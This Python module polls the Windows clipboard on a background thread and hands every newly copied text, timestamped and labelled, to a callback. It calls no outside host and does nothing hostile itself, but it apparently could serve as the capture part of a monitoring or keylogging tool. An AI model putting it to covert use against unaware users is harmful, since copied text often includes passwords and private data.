# clipboard.py — monitors clipboard for copied text

import threading, time
import win32clipboard
from datetime import datetime

_last = ""


def _get_clipboard() -> str:
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data
    except Exception:
        try:
            win32clipboard.CloseClipboard()
        except Exception:
            pass
        return ""


def start(on_copy_callback, interval: int = 3):
    """
    Poll clipboard every `interval` seconds.
    Calls on_copy_callback(text) when new content is copied.
    """
    global _last

    def loop():
        global _last
        while True:
            time.sleep(interval)
            try:
                current = _get_clipboard()
                if current and current != _last and len(current.strip()) > 0:
                    _last = current
                    ts    = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
                    on_copy_callback(f"[{ts}] CLIPBOARD COPY:\n{current}\n")
            except Exception:
                pass

    t = threading.Thread(target=loop, daemon=True)
    t.start()
